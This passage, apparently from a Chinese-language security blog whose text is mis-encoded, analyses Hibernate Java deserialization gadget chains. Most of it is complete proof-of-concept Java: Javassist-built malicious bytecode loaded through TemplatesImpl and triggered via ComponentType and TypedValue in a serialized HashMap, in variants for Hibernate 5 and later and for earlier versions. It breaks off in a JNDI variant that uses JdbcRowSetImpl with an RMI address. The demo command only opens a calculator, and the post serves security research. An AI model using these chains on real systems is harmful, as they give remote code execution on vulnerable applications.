·ä¸€å±‚ä¸€å±‚å¥—ä¸‹å»ï¼Œéœ€è¦è€ƒè™‘ä»¥åŠå¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„ç±»å°±éå¸¸å¤šï¼Œä½†æ˜¯å…¶å®æœ¬è´¨æˆ‘ä»¬å°±åªéœ€è¦æ§åˆ¶å¯¹åº”çš„å˜é‡å³å¯ï¼Œå¦‚ä½•åˆå§‹åŒ–ç±»æˆäº†ä¸€ä¸ªéœ€è¦è€ƒè™‘çš„å¤§é—®é¢˜ï¼Œå‘æ„å‘€ã€‚\nåœ¨è¿™é‡Œéœ€è¦ç”¨åˆ°äº†ä¸€ä¸ªéå¸¸å¥½ç”¨çš„ç±»ï¼šReflectionFactoryç±»ã€‚é€šè¿‡è°ƒç”¨è¿™ä¸ªç±»çš„ä¸€äº›æ–¹æ³•ï¼Œå¯ä»¥è¾¾åˆ°ä¸è°ƒç”¨å…¶ä»–ç±»çš„æ„é€ æ–¹æ³•è€Œç›´æ¥å¯¹å…¶ä»–ç±»å®ä¾‹åŒ–å¯¹è±¡ã€‚\næ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åæŒ‰éœ€æ±‚ä¿®æ”¹è¿™ä¸ªç±»çš„ç™½äº®æ¥è¾¾åˆ°æƒ³è¦çš„ç›®çš„ã€‚\næ•…ç°åœ¨å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.type.ComponentType; import org.hibernate.tuple.component.PojoComponentTuplizer; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;getOutputProperties\u0026#34;)); //part2 Class pojoComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.PojoComponentTuplizer\u0026#34;); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) getObject(pojoComponentTuplizerClass); setFieldValue(pojoComponentTuplizer, \u0026#34;getters\u0026#34;, getterMethodImpl); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, pojoComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, tem); typedValue.hashCode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”è°ƒè¯•ç¬¦åˆé“¾å­åˆ†æçš„è¿‡ç¨‹ã€‚ReflectionFactoryç±»æ˜¯çœŸå¥½ç”¨å•Šï¼Œè®©æˆ‘ä»¬å¯ä»¥åªä¸“æ³¨äºç±»ä¸­çš„å˜é‡çš„èµ‹å€¼æƒ…å†µï¼Œè€Œä¸ç”¨å»ç®¡ç±»çš„æ„é€ å‡½æ•°éœ€è¦æ»¡è¶³çš„ä¸€äº›ç±»ï¼ˆå¹¶ä¸”è¿™æ ·çš„è¯å…¶å®ä¹Ÿå¯ä»¥ç”¨å¦ä¸€ä¸ªå®ç°ç±»DynamicMapComponentTuplizeräº†ï¼Œä¸ç”¨ä¸“æ³¨äºPojoComponentTuplizerç±»çš„æ„é€ ï¼‰ã€‚\néš¾åº¦ä¸éš¾ï¼Œææ¸…æ¥šå‚æ•°ä¼ é€’å³å¯ï¼Œè¿™é‡Œå°±ä¸€ä¸ªç‚¹å€¼å¾—è¯´ä¸€ä¸‹ï¼š ç”±äºè¦ä¿®æ”¹çš„AbstractComponentTuplizeræŠ½è±¡ç±»çš„å˜é‡gettersï¼Œæ•…ä¿®æ”¹äº†ä¸€ä¸‹å¸¸è§„çš„setFieldValue()æ–¹æ³•ï¼Œå½“æˆåŠŸèµ‹å€¼åå°±ä¼šå°†clazzèµ‹å€¼ä¸ºnullï¼Œä»è€Œè·³å‡ºå¾ªç¯ã€‚\nå…¶æ¬¡å°±æ˜¯æåˆ°çš„ä»»æ„æ–¹æ³•ï¼Œä¸ªäººè®¤ä¸ºæ˜¯ä»»æ„æ— å‚æ–¹æ³•è°ƒç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥è°ƒç”¨newTransformer()æ–¹æ³•ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import org.hibernate.tuple.component.PojoComponentTuplizer; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, tem); typedValue.hashCode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } è¿è¡Œä¹Ÿæ˜¯å¼¹å‡ºè®¡ç®—æœºã€‚å¦‚ä¸Šjavaä»£ç å³å¯éªŒè¯DynamicMapComponentTuplizer+newTransformerçš„ä»»æ„æ— å‚æ•°æ–¹æ³•è°ƒç”¨ã€‚\nå°†å…¶åºåˆ—åŒ–ç”Ÿæˆæ•°æ®ï¼Œå¦‚ä¹‹å‰æ‰€è¯´å°†HashMapå½“ä½œå…¥å£ç±»å³å¯ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯¹HashMapè°ƒç”¨put()æ–¹æ³•æ”¾å…¥é”®å€¼å¯¹æ—¶ä¼šå¯¹keyè°ƒç”¨hashCode()æ–¹æ³•ï¼Œç”±æ­¤ä¼šé€ æˆä¸€æ¬¡è°ƒç”¨é“¾çš„è¿›è¡Œï¼Œæ•…éœ€è¦é¿å…è¿™ä¸ªé—®é¢˜ã€‚\næœ‰å‡ ç§è§£å†³æ–¹æ³•ï¼Œæ¯”å¦‚ä¿®æ”¹HashMapä¸­çš„å“ˆå¸Œè¡¨ç­‰ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯å…ˆæ­£å¸¸å¾€HashMapæ”¾å…¥æ— å®³çš„TypedValueç±»å®ä¾‹ï¼Œç„¶ååå°„ä¿®æ”¹ï¼Œå…¶å®åœ¨å‰é¢å¾ˆå¤šæ¡é“¾å­æˆ‘ä»¬éƒ½æ˜¯åˆ©ç”¨åˆ°è¿‡è¿™ä¸ªæ€æƒ³æ¥ç»•è¿‡åºåˆ—åŒ–å‰å¼¹å‡ºè®¡ç®—æœºçš„ã€‚æ•…æœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,tem); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºã€‚ç”±æ­¤åœ¨åºåˆ—åŒ–å‰ï¼Œåœ¨å¦‚ä¸‹åœ°æ–¹å³ä¼šåœæ­¢è°ƒç”¨é“¾çš„è¿›è¡Œï¼š\nå°±å¯ä»¥åªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºäº†ã€‚\næ³¨æ„ï¼šåœ¨ç›®å‰æœ€æ–°ç‰ˆ7.1.1åŒ…çš„ä½ç½®åˆæ”¹äº†ï¼Œå…·ä½“åœ¨5\u0026lt;=hibernate\u0026lt;?ï¼Œåˆ°æ—¶å€™é‡åˆ°é«˜ç‰ˆæœ¬å†æµ‹å§ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯åœ¨5ç‰ˆæœ¬ä»¥å†…çš„æ‰æ˜¯å¯ä»¥éƒ½æ‰“çš„ã€‚\nhibernate\u0026lt;5 å°†ç‰ˆæœ¬æ”¹æˆå¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.3.11.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å†ä½ç‰ˆæœ¬ä¸­ï¼Œä¹Ÿæ˜¯ä¿®æ”¹äº†åŒ…çš„ä½ç½®ï¼Œç›¸æ¯”äº\u0026gt;=5çš„ç‰ˆæœ¬ï¼Œåˆ é™¤æˆ–å¢åŠ äº†ä¸€äº›ç±»ã€‚\næ¯”å¦‚åŸå…ˆçš„\u0026gt;=5çš„é“¾å­ï¼Œå°±æŠ¥äº†å¦‚ä¸‹çš„é”™è¯¯ï¼š\nå°‘äº†GetterMethodImplï¼Œå¯¼è‡´æ— æ³•è°ƒç”¨åˆ°å¯¹åº”ç±»çš„æ–¹æ³•ã€‚ä½†æ˜¯ysoserialä¹Ÿæ˜¯æå‡ºäº†å¦å¤–çš„è§£å†³æ–¹æ³•ï¼š\næ‰¾åˆ°äº†å¹³æ›¿çš„å†…éƒ¨ç±»BasicGetterï¼Œè·Ÿè¿›å…¶get()æ–¹æ³•ï¼š\nä¸€æ ·çš„ï¼Œå¯ä»¥è°ƒç”¨æ— å‚æ–¹æ³•ï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œçš„Methodä¸ºtransientï¼Œåºåˆ—åŒ–æ—¶ä¼šå¿½ç•¥è¿™ä¸ªå­—æ®µã€‚\nåŒæ—¶è¿™ä¸ªå†…éƒ¨ç±»è¿˜å®ç°äº†ä¸€ä¸ªreadResolve()æ–¹æ³•ï¼š\nè¿™ä¸ªæ–¹æ³•æ˜¯åœ¨å¯¹è±¡ååºåˆ—åŒ–æ—¶è‡ªå®šä¹‰è¿”å›çš„å¯¹è±¡å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯è¯´é€šè¿‡readResolve()æ–¹æ³•æ¥ç”Ÿæˆä¸€ä¸ªBasicGetterç±»å®ä¾‹ï¼Œè·Ÿè¿›createGetter()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹å‡ºæ˜¯ç”Ÿæˆä¸€ä¸ªBasicGetterç±»å®ä¾‹ä½œä¸ºåç»­æ“ä½œçš„ç±»å¯¹è±¡ï¼Œè·Ÿè¿›getGetterOrNull()æ–¹æ³•ï¼š\nä¼šè°ƒç”¨getterMethod()æ–¹æ³•æ¥è·å–Methodï¼Œå¦‚æœmethodä¸ä¸ºç©ºå°±ä¼šå®ä¾‹åŒ–å¹¶è¿”å›BasicGetterç±»å¯¹è±¡ã€‚\nå†è·Ÿè¿›getterMethod()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private static Method getterMethod(Class theClass, String propertyName) { Method[] methods = theClass.getDeclaredMethods(); for ( Method method : methods ) { // if the method has parameters, skip it if ( method.getParameterTypes().length != 0 ) { continue; } // if the method is a \u0026#34;bridge\u0026#34;, skip it if ( method.isBridge() ) { continue; } final String methodName = method.getName(); // try \u0026#34;get\u0026#34; if ( methodName.startsWith( \u0026#34;get\u0026#34; ) ) { String testStdMethod = Introspector.decapitalize( methodName.substring( 3 ) ); String testOldMethod = methodName.substring( 3 ); if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) { return method; } } // if not \u0026#34;get\u0026#34;, then try \u0026#34;is\u0026#34; if ( methodName.startsWith( \u0026#34;is\u0026#34; ) ) { String testStdMethod = Introspector.decapitalize( methodName.substring( 2 ) ); String testOldMethod = methodName.substring( 2 ); if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) { return method; } } } return null; } å¯ä»¥çœ‹åˆ°è·å–äº†Claså¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•ï¼Œç„¶åè¿›è¡Œäº†åˆ¤æ–­ï¼Œè¦æ±‚å‚æ•°ä¸ªæ•°ä¸º0ï¼Œç„¶åå¯ä»¥è·å–åˆ°getæˆ–iså¼€å¤´çš„æ–¹æ³•ï¼Œä½†è¿™é‡Œéœ€è¦æ§åˆ¶ä¸€ä¸‹propertyNameè¿™ä¸ªå€¼ä»è€Œå¯ä»¥è·å–åˆ°æƒ³è¦çš„å€¼ï¼Œæ•…æˆ‘ä»¬å¯ä»¥æ„é€ pocå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.BasicPropertyAccessor; import org.hibernate.property.Getter; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class basicGetterClazz = Class.forName(\u0026#34;org.hibernate.property.BasicPropertyAccessor$BasicGetter\u0026#34;); BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter)getObject(basicGetterClazz); setFieldValue(basicGetter, \u0026#34;method\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;getOutputProperties\u0026#34;)); setFieldValue(basicGetter, \u0026#34;clazz\u0026#34;, tem.getClass()); setFieldValue(basicGetter, \u0026#34;propertyName\u0026#34;, \u0026#34;OutputProperties\u0026#34;); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{basicGetter}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,tem); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } è¿è¡Œå³å¯å¼¹å‡ºè®¡ç®—æœºã€‚ä½†æ˜¯æ›´ä½ç‰ˆæœ¬å¦‚3çš„ç‰ˆæœ¬ä¼¼ä¹æ˜¯ä¸èƒ½æ‰“çš„ï¼Œä¹Ÿå°±æ˜¯ä¹Ÿæ˜¯å±€é™åœ¨4è¿™ä¸ªç‰ˆæœ¬å†…ï¼Ÿå…·ä½“å°±åˆ°æ—¶å€™åœ¨çœ‹å§ã€‚\nå¹¶ä¸”ä»ä¸Šé¢ä¸åŒç‰ˆæœ¬çš„ä¸¤æ¡é“¾å­çš„åˆ†æï¼Œä¹Ÿå°±çŸ¥é“äº†ä¸ºä»€ä¹ˆ\u0026lt;5åªèƒ½æ‰“getterï¼Œè€Œ\u0026gt;=5å´å¯ä»¥æ‰“ä»»æ„æ— å‚æ„é€ æ–¹æ³•ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nhibernate2é“¾ å…¶å®å°±æ˜¯æ‰“ä¸€ä¸ªjndiï¼Œæ‰“çš„JdbcRowSetImplç±»ä¸‹çš„getDatabaseMetaData()æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨çš„connect()æ–¹æ³•å­˜åœ¨jndiæ¼æ´å¹¶ä¸”å‚æ•°å¯æ§ï¼š\nåœ¨romeé“¾å°±æåˆ°è¿‡è¿™ä¸ªæ‰“æ³•ã€‚ysoserialä¹Ÿæ˜¯ç»™å‡ºäº†åŸºæœ¬çš„è°ƒç”¨æ ˆï¼Œè¿™ä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œåœ¨å‰é¢å¯ä»¥ç›´æ¥æ‰“getterï¼Œä½†æ˜¯æˆ‘æƒ³åˆ°åœ¨hibernate\u0026gt;=5çš„æƒ…å†µä¸‹æ˜¯å¦å¯ä»¥ç›´æ¥æ‰“connect()æ–¹æ³•å‘¢ï¼Œå…¶æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ã€‚\nå…ˆç»™å‡ºhibernate\u0026lt;5ä¸‹çš„getteræ‰“jndiçš„pocï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.rowset.JdbcRowSetImpl; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.BasicPropertyAccessor; import org.hibernate.property.Getter; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); //part1 Class basicGetterClazz = Class.forName(\u0026#34;org.hibernate.property.BasicPropertyAccessor$BasicGetter\u0026#34;); BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter)getObject(basicGetterClazz); // setFieldValue(basicGetter, \u0026#34;method\u0026#34;, jdbcRowSet.getClass().getDeclaredMethod(\u0026#34;getDatabaseMetaData\u0026#34;)); 